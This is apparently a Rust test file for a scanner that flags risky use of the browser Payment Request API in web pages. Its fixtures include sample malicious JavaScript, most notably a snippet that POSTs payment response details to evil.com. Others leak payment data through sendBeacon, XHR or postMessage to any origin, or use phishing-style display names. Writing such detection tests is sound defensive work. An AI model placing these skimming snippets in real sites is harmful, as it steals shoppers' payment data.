use crate::payment_request_audit::*;

#[test]
fn no_payment_api_no_issues() {
    assert!(analyze_payment_request("<html></html>", true).is_empty());
}

#[test]
fn detects_api_usage() {
    let body = r#"<script>new PaymentRequest(methods, details)</script>"#;
    let issues = analyze_payment_request(body, true);
    assert!(issues.contains(&PaymentRequestIssue::ApiDetected));
}

#[test]
fn detects_insecure_context() {
    let body = r#"<script>new PaymentRequest(methods, details)</script>"#;
    let issues = analyze_payment_request(body, false);
    assert!(issues.contains(&PaymentRequestIssue::InsecureContext));
}

#[test]
fn no_insecure_on_https() {
    let body = r#"<script>new PaymentRequest(methods, details)</script>"#;
    let issues = analyze_payment_request(body, true);
    assert!(!issues.contains(&PaymentRequestIssue::InsecureContext));
}

#[test]
fn detects_can_make_payment_fingerprint() {
    let body = r#"<script>
        const req = new PaymentRequest(methods, details);
        req.canMakePayment().then(result => { track(result); });
    </script>"#;
    let issues = analyze_payment_request(body, true);
    assert!(issues.contains(&PaymentRequestIssue::CanMakePaymentFingerprint));
}

#[test]
fn detects_third_party_method() {
    let body = r#"<script>
        const methods = [{supportedMethods: "https://apple.com/apple-pay"}];
        new PaymentRequest(methods, details);
    </script>"#;
    let issues = analyze_payment_request(body, true);
    assert!(issues.contains(&PaymentRequestIssue::ThirdPartyPaymentMethod));
}

#[test]
fn no_third_party_without_known_urls() {
    let body = r#"<script>
        const methods = [{supportedMethods: "basic-card"}];
        new PaymentRequest(methods, details);
    </script>"#;
    let issues = analyze_payment_request(body, true);
    assert!(!issues.contains(&PaymentRequestIssue::ThirdPartyPaymentMethod));
}

#[test]
fn detects_no_input_validation() {
    let body = r#"<script>new PaymentRequest(methods, details).show()</script>"#;
    let issues = analyze_payment_request(body, true);
    assert!(issues.contains(&PaymentRequestIssue::NoInputValidation));
}

#[test]
fn no_validation_issue_with_event_listener() {
    let body = r#"<script>
        const req = new PaymentRequest(methods, details);
        req.addEventListener("paymentmethodchange", handler);
    </script>"#;
    let issues = analyze_payment_request(body, true);
    assert!(!issues.contains(&PaymentRequestIssue::NoInputValidation));
}

#[test]
fn detects_multiple_methods() {
    let body = r#"<script>
        const methods = [
            {supportedMethods: "basic-card"},
            {supportedMethods: "apple-pay"},
            {supportedMethods: "google-pay"},
            {supportedMethods: "samsung-pay"},
        ];
        new PaymentRequest(methods, details);
    </script>"#;
    let issues = analyze_payment_request(body, true);
    assert!(issues.contains(&PaymentRequestIssue::MultiplePaymentMethods));
}

#[test]
fn no_multiple_with_one_method() {
    let body = r#"<script>
        const methods = [{supportedMethods: "basic-card"}];
        new PaymentRequest(methods, details);
    </script>"#;
    let issues = analyze_payment_request(body, true);
    assert!(!issues.contains(&PaymentRequestIssue::MultiplePaymentMethods));
}

#[test]
fn severity_insecure_highest() {
    assert_eq!(
        payment_request_severity(&PaymentRequestIssue::InsecureContext),
        7.0
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(
        payment_request_severity(&PaymentRequestIssue::ApiDetected),
        3.0
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        PaymentRequestIssue::ApiDetected,
        PaymentRequestIssue::InsecureContext,
    ];
    let mut seq = 0;
    let ops = payment_request_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(PaymentRequestIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        PaymentRequestIssue::CanMakePaymentFingerprint.to_string(),
        "can_make_payment_fingerprint"
    );
    assert_eq!(
        PaymentRequestIssue::InsecureContext.to_string(),
        "insecure_context"
    );
    assert_eq!(
        PaymentRequestIssue::ThirdPartyPaymentMethod.to_string(),
        "third_party_payment_method"
    );
    assert_eq!(
        PaymentRequestIssue::NoInputValidation.to_string(),
        "no_input_validation"
    );
    assert_eq!(
        PaymentRequestIssue::MultiplePaymentMethods.to_string(),
        "multiple_payment_methods"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_payment_request("", true).is_empty());
}

#[test]
pub fn security_no_payment_api_no_issues() {
    assert!(analyze_payment_security("<html></html>", true).is_empty());
}

#[test]
pub fn security_empty_body_no_issues() {
    assert!(analyze_payment_security("", true).is_empty());
}

#[test]
pub fn security_detects_payment_data_exfiltration() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            const details = response.details;
            fetch("https://evil.com/collect", {
                method: "POST",
                body: JSON.stringify(details)
            });
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentDataExfiltration));
}

#[test]
pub fn security_detects_exfiltration_with_sendbeacon() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            navigator.sendBeacon("/track", JSON.stringify(response.details));
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentDataExfiltration));
}

#[test]
pub fn security_detects_exfiltration_with_xmlhttprequest() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        const xhr = new XMLHttpRequest();
        request.show().then(response => {
            xhr.open("POST", "/api");
            xhr.send(JSON.stringify(response.details));
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentDataExfiltration));
}

#[test]
pub fn security_no_exfiltration_without_network_call() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            const details = response.details;
            console.log(details);
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(!issues.contains(&PaymentRequestSecurityIssue::PaymentDataExfiltration));
}

#[test]
pub fn security_detects_payment_without_https() {
    let body = r#"<script>new PaymentRequest(methods, details)</script>"#;
    let issues = analyze_payment_security(body, false);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentWithoutHttps));
}

#[test]
pub fn security_no_https_issue_on_secure_context() {
    let body = r#"<script>new PaymentRequest(methods, details)</script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(!issues.contains(&PaymentRequestSecurityIssue::PaymentWithoutHttps));
}

#[test]
pub fn security_detects_payment_phishing_urgent() {
    let body = r#"<script>
        const details = {
            displayName: "urgent payment verification required",
            total: { label: "Total", amount: { currency: "USD", value: "99.99" } }
        };
        new PaymentRequest(methods, details);
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentPhishing));
}

#[test]
pub fn security_detects_payment_phishing_verify() {
    let body = r#"<script>
        let displayName = "verify your account now";
        new PaymentRequest(methods, {displayName, total});
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentPhishing));
}

#[test]
pub fn security_detects_payment_phishing_suspended() {
    let body = r#"<script>
        const details = {
            displayName: "account suspended - immediate payment needed",
            total: { label: "Total", amount: { currency: "USD", value: "199.99" } }
        };
        new PaymentRequest(methods, details);
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentPhishing));
}

#[test]
pub fn security_no_phishing_with_normal_displayname() {
    let body = r#"<script>
        const details = {
            displayName: "Merchant Store Checkout",
            total: { label: "Total", amount: { currency: "USD", value: "99.99" } }
        };
        new PaymentRequest(methods, details);
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(!issues.contains(&PaymentRequestSecurityIssue::PaymentPhishing));
}

#[test]
pub fn security_detects_payment_cross_origin() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            window.parent.postMessage(response.details, "*");
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentCrossOrigin));
}

#[test]
pub fn security_no_cross_origin_without_postmessage() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            processPayment(response.details);
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(!issues.contains(&PaymentRequestSecurityIssue::PaymentCrossOrigin));
}

#[test]
pub fn security_detects_payment_persistence_localstorage() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            localStorage.setItem("payment", JSON.stringify(response.details));
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentPersistence));
}

#[test]
pub fn security_detects_payment_persistence_sessionstorage() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            sessionStorage.setItem("lastPayment", JSON.stringify(response.details));
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentPersistence));
}

#[test]
pub fn security_detects_payment_persistence_indexeddb() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            const db = indexedDB.open("payments");
            db.onsuccess = () => {
                db.result.add(response.details);
            };
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentPersistence));
}

#[test]
pub fn security_no_persistence_without_storage() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            submitToServer(response.details);
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(!issues.contains(&PaymentRequestSecurityIssue::PaymentPersistence));
}

#[test]
pub fn security_detects_payment_without_validation() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            completeCheckout();
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentWithoutValidation));
}

#[test]
pub fn security_no_validation_issue_when_checking_details() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            if (response.details && response.requestId) {
                completeCheckout();
            }
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(!issues.contains(&PaymentRequestSecurityIssue::PaymentWithoutValidation));
}

#[test]
pub fn security_detects_payment_in_iframe_parent() {
    let body = r#"<script>
        if (window.parent) {
            const request = new PaymentRequest(methods, details);
            request.show();
        }
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentInIframe));
}

#[test]
pub fn security_detects_payment_in_iframe_top() {
    let body = r#"<script>
        if (window.top !== window) {
            const request = new PaymentRequest(methods, details);
            request.show();
        }
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentInIframe));
}

#[test]
pub fn security_detects_payment_in_iframe_self() {
    let body = r#"<script>
        if (window.self !== window.self) {
            const request = new PaymentRequest(methods, details);
        }
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentInIframe));
}

#[test]
pub fn security_no_iframe_issue_without_checks() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show();
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(!issues.contains(&PaymentRequestSecurityIssue::PaymentInIframe));
}

#[test]
pub fn security_detects_excessive_payment_data() {
    let body = r#"<script>
        const options = {
            requestShipping: true,
            requestPayerName: true,
            requestPayerEmail: true,
            requestPayerPhone: true
        };
        const request = new PaymentRequest(methods, details, options);
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::ExcessivePaymentData));
}

#[test]
pub fn security_detects_excessive_with_name_only() {
    let body = r#"<script>
        const options = {
            requestShipping: true,
            requestPayerName: true
        };
        const request = new PaymentRequest(methods, details, options);
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::ExcessivePaymentData));
}

#[test]
pub fn security_no_excessive_without_shipping() {
    let body = r#"<script>
        const options = {
            requestPayerName: true,
            requestPayerEmail: true
        };
        const request = new PaymentRequest(methods, details, options);
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(!issues.contains(&PaymentRequestSecurityIssue::ExcessivePaymentData));
}

#[test]
pub fn security_detects_payment_method_enumeration() {
    let body = r#"<script>
        const req1 = new PaymentRequest(methods1, details);
        req1.canMakePayment().then(r1 => track(r1));
        req2.canMakePayment().then(r2 => track(r2));
        req3.canMakePayment().then(r3 => track(r3));
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentMethodEnumeration));
}

#[test]
pub fn security_no_enumeration_with_single_check() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.canMakePayment().then(result => {
            if (result) request.show();
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(!issues.contains(&PaymentRequestSecurityIssue::PaymentMethodEnumeration));
}

#[test]
pub fn security_no_enumeration_with_two_checks() {
    let body = r#"<script>
        const req1 = new PaymentRequest(methods1, details);
        req1.canMakePayment();
        req2.canMakePayment();
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(!issues.contains(&PaymentRequestSecurityIssue::PaymentMethodEnumeration));
}

#[test]
pub fn security_detects_payment_token_exposure_console() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            const paymentToken = response.details.token;
            console.log("Token:", paymentToken);
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentTokenExposure));
}

#[test]
pub fn security_detects_token_exposure_localstorage() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            localStorage.setItem("token", response.details.paymentToken);
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentTokenExposure));
}

#[test]
pub fn security_detects_nonce_exposure() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            const nonce = response.details.nonce;
            console.log(nonce);
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentTokenExposure));
}

#[test]
pub fn security_detects_transaction_id_exposure() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            sessionStorage.setItem("txId", response.transactionId);
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentTokenExposure));
}

#[test]
pub fn security_no_token_exposure_without_logging() {
    let body = r#"<script>
        const request = new PaymentRequest(methods, details);
        request.show().then(response => {
            const paymentToken = response.details.token;
            submitToServer(paymentToken);
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(!issues.contains(&PaymentRequestSecurityIssue::PaymentTokenExposure));
}

#[test]
pub fn security_display_variants() {
    assert_eq!(
        PaymentRequestSecurityIssue::PaymentDataExfiltration.to_string(),
        "payment_data_exfiltration"
    );
    assert_eq!(
        PaymentRequestSecurityIssue::PaymentWithoutHttps.to_string(),
        "payment_without_https"
    );
    assert_eq!(
        PaymentRequestSecurityIssue::PaymentPhishing.to_string(),
        "payment_phishing"
    );
    assert_eq!(
        PaymentRequestSecurityIssue::PaymentCrossOrigin.to_string(),
        "payment_cross_origin"
    );
    assert_eq!(
        PaymentRequestSecurityIssue::PaymentPersistence.to_string(),
        "payment_persistence"
    );
    assert_eq!(
        PaymentRequestSecurityIssue::PaymentWithoutValidation.to_string(),
        "payment_without_validation"
    );
    assert_eq!(
        PaymentRequestSecurityIssue::PaymentInIframe.to_string(),
        "payment_in_iframe"
    );
    assert_eq!(
        PaymentRequestSecurityIssue::ExcessivePaymentData.to_string(),
        "excessive_payment_data"
    );
    assert_eq!(
        PaymentRequestSecurityIssue::PaymentMethodEnumeration.to_string(),
        "payment_method_enumeration"
    );
    assert_eq!(
        PaymentRequestSecurityIssue::PaymentTokenExposure.to_string(),
        "payment_token_exposure"
    );
}

#[test]
pub fn security_severity_exfiltration_highest() {
    assert_eq!(
        payment_security_severity(&PaymentRequestSecurityIssue::PaymentDataExfiltration),
        9.0
    );
}

#[test]
pub fn security_severity_enumeration_lowest() {
    assert_eq!(
        payment_security_severity(&PaymentRequestSecurityIssue::PaymentMethodEnumeration),
        3.0
    );
}

#[test]
pub fn security_severity_token_exposure() {
    assert_eq!(
        payment_security_severity(&PaymentRequestSecurityIssue::PaymentTokenExposure),
        8.5
    );
}

#[test]
pub fn security_severity_phishing() {
    assert_eq!(
        payment_security_severity(&PaymentRequestSecurityIssue::PaymentPhishing),
        8.0
    );
}

#[test]
pub fn security_to_operations_creates_entries() {
    let issues = vec![
        PaymentRequestSecurityIssue::PaymentDataExfiltration,
        PaymentRequestSecurityIssue::PaymentTokenExposure,
    ];
    let mut seq = 0;
    let ops = payment_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
pub fn security_to_operations_empty() {
    let issues = vec![];
    let mut seq = 5;
    let ops = payment_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 0);
    assert_eq!(seq, 5);
}

#[test]
pub fn security_multiple_issues_detected() {
    let body = r#"<script>
        const details = {
            displayName: "urgent payment required",
            total: { label: "Total", amount: { currency: "USD", value: "99.99" } }
        };
        const options = {
            requestShipping: true,
            requestPayerName: true,
            requestPayerEmail: true
        };
        const request = new PaymentRequest(methods, details, options);
        request.show().then(response => {
            localStorage.setItem("payment", JSON.stringify(response.details));
            window.parent.postMessage(response.details, "*");
        });
    </script>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentPhishing));
    assert!(issues.contains(&PaymentRequestSecurityIssue::ExcessivePaymentData));
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentPersistence));
    assert!(issues.contains(&PaymentRequestSecurityIssue::PaymentCrossOrigin));
}

#[test]
pub fn security_no_keywords_no_issues() {
    let body = r#"<html>
        <body>
            <h1>Welcome</h1>
            <p>This is a regular page with no payment functionality.</p>
        </body>
    </html>"#;
    let issues = analyze_payment_security(body, true);
    assert!(issues.is_empty());
}
